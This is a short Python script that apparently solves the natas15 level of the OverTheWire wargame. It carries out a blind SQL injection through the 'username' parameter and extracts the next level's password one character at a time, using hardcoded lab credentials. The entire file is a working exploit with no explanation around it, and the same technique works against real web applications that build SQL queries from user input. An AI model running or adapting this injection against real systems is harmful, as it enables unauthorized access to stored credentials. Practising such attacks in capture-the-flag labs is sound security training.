import requests

u = "http://natas15.natas.labs.overthewire.org/index.php"
a = ("natas15", "GB6USCJYJjwLyYhZUNkE1NwDueiTow6g")  
cs = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

p = ""
while True:
    f = False
    for c in cs:
        pl = f'natas16" AND password LIKE BINARY "{p+c}%" #'
        r = requests.get(u, params={"username": pl}, auth=a)
        if "This user exists" in r.text:
            p += c
            print(p)
            f = True
            break
    if not f:      
        break

print("natas16:", p)
